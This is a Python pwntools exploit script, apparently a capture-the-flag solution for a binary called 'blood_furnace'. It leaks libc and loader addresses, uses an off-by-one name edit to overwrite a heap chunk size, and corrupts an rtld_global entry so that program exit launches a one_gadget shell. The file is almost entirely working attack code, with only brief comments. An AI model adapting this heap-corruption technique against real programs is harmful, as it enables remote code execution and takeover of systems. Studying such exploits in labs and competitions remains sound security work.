#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "138.68.186.7"
PORT = 32492
PROCESS = "./blood_furnace"

def init(name, guild, story):
	r.sendlineafter(": ", name)
	r.sendlineafter(": ", guild)
	r.sendlineafter(": ", story)
	r.sendlineafter(": ", "1")

def get_leak():
	r.sendline("1")
	r.recvuntil("]: ")
	while True:
		r.sendline("1")
		r.recvline()
		TEST = r.recvline()
		print("T: "+TEST)
		if "fatal attack" in TEST:
			r.sendlineafter("[y/n] ", "y")
			r.sendlineafter("price? ", "+")
			r.recvuntil("for ")
			LEAK = int(r.recvuntil(" coins", drop=True))
			r.sendlineafter("[y/n] ", "y")
			r.sendlineafter("price? ", "+")
			r.recvuntil("for ")
			LEAK2 = int(r.recvuntil(" coins", drop=True))

			return LEAK, LEAK2
		else:
			r.recvuntil("]: ")

def setname(name):
	r.sendline("2")
	r.recvuntil("]: ")
	r.sendline("1")
	
	r.sendline(name)
	r.recvuntil("]: ")

def setguild(name):
	r.sendline("2")
	r.recvuntil("]: ")
	r.sendline("2")
	r.sendlineafter(": ", name)
	r.recvuntil("]: ")

def exploit(r):
	# create initial chunks
	init ("A"*(0x20-8-1), "B"*(0x110-8-1), "C"*(0x110-8-1))

	r.recvuntil("]: ")

	# leak libc and ld from drops
	LIBCLEAK, LDLEAK = get_leak()
	r.recvuntil("]: ")

	log.info("LIBC LEAK  : %s" % hex(LIBCLEAK))
	log.info("LD LEAK    : %s" % hex(LDLEAK))

	libc.address = LIBCLEAK - 0x8cf43

	log.info("LIBC       : %s" % hex(libc.address))

	# go into edit menu
	r.sendline("2")
	r.recvuntil("]: ")

	# change name to make it 1 byte longer	
	setname("A"*(0x20-8))

	# change name again (now it can also overwrite next chunk size)
	setname("A"*(0x20-8)+p16(0x251))		# overwrite guild size )

	# reallocate guild and overwrite character info
	payload = "A"*(16*0x10)
	payload += "BBBBBBBB" + p64(0x111)
	payload += "B"*(16*0x10)
	payload += "CCCCCCCC" + p64(0x31)
	payload += p64(0xdeadbeef) + p64(0xcafebabe)
	payload += p64(LDLEAK+0xaa0) + p64(LDLEAK+0xaa0)		# point to ld rtld_global
	
	setguild(payload)
	
	# reallocate guild again (now overwriting entry in rtld_global)	
	payload = ""
	payload += p64(libc.address+0xebcf1-0x18)+p64(0xdeadbee6)		
	payload += p64(0xdeadbee7)+p64(0)
	payload += p64(0xdeadbee9)+p64(LDLEAK+0xaa0)						# pointer to start of rtld entry to pass check
	payload += p64(0xdeadbee3)+p64(0xdedbeea)
	payload += p64(0xdeadbee4)+p64(0xdeadbeeb)
	payload += p64(0xdeadbee5)+p64(0xdeadbee6)
	payload += p64(0xdeadbeef)[:6]
		
	setguild(payload)

	# exit to trigger one_gadget
	r.sendline("3")
	
	r.interactive()
	
	return

if __name__ == "__main__":
	libc = ELF("./libc.so.6")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)		
	else:
		LOCAL = True
		r = process("./blood_furnace")
		
		print (util.proc.pidof(r))
		pause()
	
	exploit(r)